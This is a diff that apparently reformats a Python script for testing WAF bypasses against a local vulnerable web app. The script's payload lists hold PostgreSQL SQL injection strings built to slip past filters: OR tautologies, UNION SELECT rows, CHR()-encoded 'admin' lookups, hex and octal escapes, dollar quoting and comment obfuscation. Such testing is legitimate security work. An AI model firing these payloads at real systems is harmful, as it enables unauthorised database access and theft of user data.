@@ -5,8 +5,9 @@ Tests interesting obfuscation techniques through vulnerable web app.
 """
 
 import os
-import requests
 import sys
+
+import requests
 
 # Target URL - override with BASE_URL environment variable
 BASE_URL = os.environ.get("BASE_URL", "http://localhost:3000")
@@ -54,10 +55,14 @@ def validate_outfile(path: str, force: bool = False) -> str:
     # Prevent accidental overwrites without --force
     if os.path.exists(normalized) and not force:
         print(f"ERROR: File already exists: {normalized}", file=sys.stderr)
-        print("Use --force to overwrite, or specify a different filename.", file=sys.stderr)
+        print(
+            "Use --force to overwrite, or specify a different filename.",
+            file=sys.stderr,
+        )
         sys.exit(1)
 
     return normalized
+
 
 def test_payload(endpoint, param, payload, desc=None):
     """Test a payload and return result.
@@ -74,22 +79,32 @@ def test_payload(endpoint, param, payload, desc=None):
     result_base = {"desc": desc}
     try:
         if endpoint == "/users":
-            r = requests.get(f"{BASE_URL}{endpoint}", params={param: payload}, timeout=5)
+            r = requests.get(
+                f"{BASE_URL}{endpoint}", params={param: payload}, timeout=5
+            )
         else:
             r = requests.post(f"{BASE_URL}{endpoint}", json={param: payload}, timeout=5)
 
         try:
             data = r.json()
         except ValueError:
-            return {**result_base, "success": False, "error": f"Invalid JSON response: {r.text[:50]}"}
+            return {
+                **result_base,
+                "success": False,
+                "error": f"Invalid JSON response: {r.text[:50]}",
+            }
 
         # Check if injection worked (got more than expected or specific data)
         if "users" in data:
-            return {**result_base, "success": True, "count": len(data["users"]), "data": data}
-        elif "error" in data:
+            return {
+                **result_base,
+                "success": True,
+                "count": len(data["users"]),
+                "data": data,
+            }
+        if "error" in data:
             return {**result_base, "success": False, "error": data["error"][:50]}
-        else:
-            return {**result_base, "success": True, "data": data}
+        return {**result_base, "success": True, "data": data}
     except requests.RequestException as e:
         return {**result_base, "success": False, "error": str(e)[:50]}
 
@@ -125,9 +140,9 @@ def main():
     # ===========================================
     # 1. DOLLAR QUOTE VARIATIONS
     # ===========================================
-    print("="*60)
+    print("=" * 60)
     print("1. DOLLAR QUOTE VARIATIONS")
-    print("="*60)
+    print("=" * 60)
     results.append("\n## 1. Dollar Quote Variations\n")
 
     dollar_tests = [
@@ -155,9 +170,9 @@ def main():
     # ===========================================
     # 2. STRING ENCODING BYPASSES
     # ===========================================
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("2. STRING ENCODING BYPASSES")
-    print("="*60)
+    print("=" * 60)
     results.append("\n## 2. String Encoding Bypasses\n")
 
     # CHR() to avoid 'admin' string
@@ -166,7 +181,10 @@ def main():
     encoding_tests = [
         # CHR() encoding
         (f"1 OR username=({chr_admin})--", "CHR() concat"),
-        ("1 OR username=CONCAT(CHR(97),CHR(100),CHR(109),CHR(105),CHR(110))--", "CONCAT+CHR()"),
+        (
+            "1 OR username=CONCAT(CHR(97),CHR(100),CHR(109),CHR(105),CHR(110))--",
+            "CONCAT+CHR()",
+        ),
         # Escape strings
         ("1 OR username=E'\\x61\\x64\\x6d\\x69\\x6e'--", "E'' hex escape"),
         ("1 OR username=E'\\141\\144\\155\\151\\156'--", "E'' octal escape"),
@@ -189,9 +207,9 @@ def main():
     # ===========================================
     # 3. BOOLEAN REPRESENTATION BYPASSES
     # ===========================================
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("3. BOOLEAN REPRESENTATION BYPASSES")
-    print("="*60)
+    print("=" * 60)
     results.append("\n## 3. Boolean Representation Bypasses\n")
 
     bool_tests = [
@@ -222,9 +240,9 @@ def main():
     # ===========================================
     # 4. NUMERIC OBFUSCATION
     # ===========================================
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("4. NUMERIC OBFUSCATION")
-    print("="*60)
+    print("=" * 60)
     results.append("\n## 4. Numeric Obfuscation\n")
 
     # Different ways to express "id=1"
@@ -264,9 +282,9 @@ def main():
     # ===========================================
     # 5. OPERATOR ALTERNATIVES
     # ===========================================
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("5. OPERATOR ALTERNATIVES")
-    print("="*60)
+    print("=" * 60)
     results.append("\n## 5. Operator Alternatives\n")
 
     # Alternatives to LIKE for pattern matching
@@ -300,9 +318,9 @@ def main():
     # ===========================================
     # 6. TYPE CASTING VARIATIONS
     # ===========================================
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("6. TYPE CASTING VARIATIONS")
-    print("="*60)
+    print("=" * 60)
     results.append("\n## 6. Type Casting Variations\n")
 
     cast_tests = [
@@ -332,9 +350,9 @@ def main():
     # ===========================================
     # 7. SCHEMA-QUALIFIED FUNCTIONS
     # ===========================================
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("7. SCHEMA-QUALIFIED FUNCTIONS")
-    print("="*60)
+    print("=" * 60)
     results.append("\n## 7. Schema-Qualified Functions\n")
 
     schema_tests = [
@@ -357,9 +375,9 @@ def main():
     # ===========================================
     # 8. UNION-BASED WITH OBFUSCATION
     # ===========================================
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("8. UNION-BASED WITH OBFUSCATION")
-    print("="*60)
+    print("=" * 60)
     results.append("\n## 8. UNION-Based with Obfuscation\n")
 
     # The app returns: id, username, email, role
@@ -369,9 +387,15 @@ def main():
         # With CHR()
         (f"0 UNION SELECT 1,{chr_admin},$$t@t.com$$,$$user$$--", "UNION + CHR()"),
         # With E''
-        ("0 UNION SELECT 1,E'\\x74\\x65\\x73\\x74',$$t@t.com$$,$$user$$--", "UNION + E'' hex"),
+        (
+            "0 UNION SELECT 1,E'\\x74\\x65\\x73\\x74',$$t@t.com$$,$$user$$--",
+            "UNION + E'' hex",
+        ),
         # With U&''
-        ("0 UNION SELECT 1,U&'\\0074\\0065\\0073\\0074',$$t@t.com$$,$$user$$--", "UNION + U&''"),
+        (
+            "0 UNION SELECT 1,U&'\\0074\\0065\\0073\\0074',$$t@t.com$$,$$user$$--",
+            "UNION + U&''",
+        ),
         # With type casting
         ("0 UNION SELECT '1'::int,$$test$$,$$t@t.com$$,$$user$$--", "UNION + ::int"),
         # With scientific notation
@@ -397,17 +421,23 @@ def main():
     # ===========================================
     # 9. COMBINED OBFUSCATION TECHNIQUES
     # ===========================================
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("9. COMBINED OBFUSCATION TECHNIQUES")
-    print("="*60)
+    print("=" * 60)
     results.append("\n## 9. Combined Obfuscation Techniques\n")
 
     combined_tests = [
         # Multiple techniques combined
         ("1e0 OR 'yes'::boolean--", "scientific + bool"),
         (f"1 OR username=({chr_admin}) AND 'on'::boolean--", "CHR + bool"),
-        ("0/**/UNION/**/SELECT/**/1,$α$test$α$,$β$t@t$β$,$γ$user$γ$--", "/**/ + unicode tags"),
-        ("0%09UNION%09SELECT%09'1'::int,$$test$$,$$t@t.com$$,$$user$$--", "tab + cast + $$"),
+        (
+            "0/**/UNION/**/SELECT/**/1,$α$test$α$,$β$t@t$β$,$γ$user$γ$--",
+            "/**/ + unicode tags",
+        ),
+        (
+            "0%09UNION%09SELECT%09'1'::int,$$test$$,$$t@t.com$$,$$user$$--",
+            "tab + cast + $$",
+        ),
         ("ABS(-1) OR pg_catalog.length(username)>0--", "func + schema-qualified"),
     ]
 
@@ -423,13 +453,15 @@ def main():
 
     # Print summary
     print(f"\nSummary: {successful_tests}/{total_tests} payloads bypassed WAF")
-    results.append(f"\n## Summary\n- Total: {total_tests}\n- Bypassed: {successful_tests}\n- Blocked: {total_tests - successful_tests}")
+    results.append(
+        f"\n## Summary\n- Total: {total_tests}\n- Bypassed: {successful_tests}\n- Blocked: {total_tests - successful_tests}"
+    )
 
     # Write results
-    output_content = '\n'.join(results)
+    output_content = "\n".join(results)
     write_failed = False
     try:
-        with open(outfile, 'w', encoding='utf-8') as f:
+        with open(outfile, "w", encoding="utf-8") as f:
             f.write(output_content)
             f.flush()
             os.fsync(f.fileno())
@@ -439,12 +471,12 @@ def main():
         print("Outputting results to stderr instead:\n", file=sys.stderr)
         print(output_content, file=sys.stderr)
 
-    print(f"\n{'='*60}")
+    print(f"\n{'=' * 60}")
     if write_failed:
         print("Results output to stderr (file write failed)")
     else:
         print(f"Results written to: {outfile}")
-    print(f"{'='*60}")
+    print(f"{'=' * 60}")
     return 1 if write_failed else 0
 
 
